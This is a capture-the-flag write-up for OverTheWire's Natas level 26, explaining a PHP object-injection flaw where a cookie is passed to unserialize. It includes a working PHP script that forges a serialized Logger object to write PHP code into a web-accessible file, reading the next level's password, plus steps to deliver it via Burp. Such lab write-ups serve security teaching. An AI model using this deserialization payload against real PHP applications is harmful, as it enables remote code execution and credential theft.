The key line is:

$drawing = unserialize(base64_decode($_COOKIE["drawing"]));

If we can craft a malicious object and pass it via the drawing cookie, PHP will unserialize and execute its magic methods — particularly __destruct() in the Logger class, which writes to a file

Create a Logger object with a path we control.

Inject PHP code as the exitMsg.

Trigger __destruct() via unserialize by sending a cookie.

Include the log file to execute our code.

```
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="heyyyyyy\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/a.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";

?>
```

run this php locally and get the encoded key.

capture the request in burp and paste the copied key in drawing cookie.


![image](https://github.com/user-attachments/assets/2e54fb5c-2944-480b-bc2f-14780d6ca1c3)

Now access the a.php in the web browser to get the answer: http://natas26.natas.labs.overthewire.org/img/a.php


![image](https://github.com/user-attachments/assets/87504701-a13c-4a23-83d2-c77c0dd9cae1)



